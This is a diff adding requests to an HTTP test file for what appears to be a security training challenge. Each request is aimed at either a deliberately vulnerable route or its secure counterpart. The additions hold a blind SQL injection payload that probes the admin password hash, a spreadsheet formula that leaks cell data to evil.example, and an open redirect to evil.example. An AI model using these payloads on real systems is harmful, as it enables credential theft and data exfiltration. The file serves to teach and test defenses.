@@ -76,3 +76,31 @@ POST {{base}}/secure/comments
 Content-Type: text/plain
 
 hello
+
+# ───────────────────────── Desafío, etapa 1 ─────────────────────────
+
+### Reto 1: blind SQLi en ORDER BY. Condición verdadera -> orden ascendente
+GET {{base}}/vuln/comments/sorted?sort=(CASE%20WHEN%20(SELECT%20substr(password_hash,1,1)%20FROM%20users%20WHERE%20username='admin')='p'%20THEN%20id%20ELSE%20-id%20END)
+
+### Reto 1: mismo payload, ruta segura -> 422
+GET {{base}}/secure/comments/sorted?sort=(CASE%20WHEN%20(SELECT%20substr(password_hash,1,1)%20FROM%20users%20WHERE%20username='admin')='p'%20THEN%20id%20ELSE%20-id%20END)
+
+### Reto 1: uso legítimo
+GET {{base}}/secure/comments/sorted?sort=author&direction=DESC
+
+### Reto 2: guardar una fórmula (después exportar /vuln y /secure)
+POST {{base}}/vuln/comments
+Content-Type: application/json
+
+{"author": "mallory", "body": "=HYPERLINK(\"https://evil.example/?d=\"&A1,\"Ver detalle\")"}
+
+### Reto 2: export vulnerable vs. seguro
+GET {{base}}/vuln/comments/export.csv
+###
+GET {{base}}/secure/comments/export.csv
+
+### Reto 3: open redirect
+GET {{base}}/vuln/redirect?next=//evil.example
+
+### Reto 3: ruta segura -> Location: /
+GET {{base}}/secure/redirect?next=//evil.example
